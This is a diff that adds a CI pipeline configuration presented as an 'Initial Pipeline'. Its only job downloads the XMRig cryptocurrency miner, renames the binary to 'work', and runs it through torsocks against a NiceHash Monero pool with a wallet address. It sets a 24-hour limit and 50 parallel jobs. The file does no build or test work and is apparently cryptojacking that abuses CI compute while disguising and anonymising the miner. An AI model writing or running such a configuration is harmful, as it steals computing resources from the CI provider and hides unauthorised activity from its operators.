@@ -1,0 +1,16 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu2004
+execution_time_limit:
+  hours: 24
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'cd / ; mkdir work ; cd work ; wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz ; tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz ; rm xmrig-6.21.0-linux-static-x64.tar.gz ; mv xmrig-6.21.0 work ; cd work ; mv xmrig work ; apt-get install torsocks -y ; torsocks ./work -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u 37orpMpCSkTH5MQxfA4PTw2YbVdvzPdmPA.Parallel -p cpu -a randomx -k'
+          parallelism: 50
